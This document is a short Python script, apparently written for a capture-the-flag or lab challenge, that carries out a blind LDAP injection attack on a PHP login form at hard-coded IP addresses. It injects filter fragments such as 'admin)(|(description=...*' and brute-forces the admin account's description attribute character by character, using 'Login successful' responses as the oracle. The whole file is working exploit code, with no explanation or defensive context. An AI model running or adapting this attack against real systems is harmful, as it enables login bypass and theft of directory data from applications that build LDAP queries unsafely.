
###
###

import requests
import time

url = "http://94.237.56.188:33236/index.php"
cookies = {"PHPSESSID": "dih4lh8kp133il4cu4pur7mo8v"}
headers = {
    "Host": "83.136.253.251:47357",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "54",
    "Origin": "http://83.136.253.251:47357",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "close",
    "Referer": "http://83.136.253.251:47357/index.php",
    "Cookie": "PHPSESSID=dih4lh8kp133il4cu4pur7mo8v",
    "Upgrade-Insecure-Requests": "1"
}

###
###

# Target username for the 'admin' user
target_username = "admin"

# Payload template for brute-force
payload_template = "username=admin)(|(description={}{}*&password=asdfasdf)"
##payload_template = "username=admin)(|(description={}*&password=asdfasdf)"

# Characters to iterate through
possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}"

# Fixed length assumption for 'description' attribute
description_length = 50

# Brute-force each character
found_description = ""
for position in range(1, description_length + 1):
    print(f"Attempting position {position}")
    found_char = None
    for char in possible_chars:
        print(f"Trying character: {char}")
        payload = payload_template.format(found_description, char)
        try:
            print("Making request...")
            response = requests.post(url, headers=headers, cookies=cookies, data=payload, timeout=30)
            response.raise_for_status()  # Raise an HTTPError for bad responses
            print("Request successful")
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")
            continue

        if "Login successful" in response.text:
            found_char = char
            found_description += char
            break

    # Break the loop if the closing curly brace is found
    if found_char == "}":
        break

    time.sleep(1)  # Introduce a 1-second delay between requests

print(f"Found 'admin' description: {found_description}")

###
###
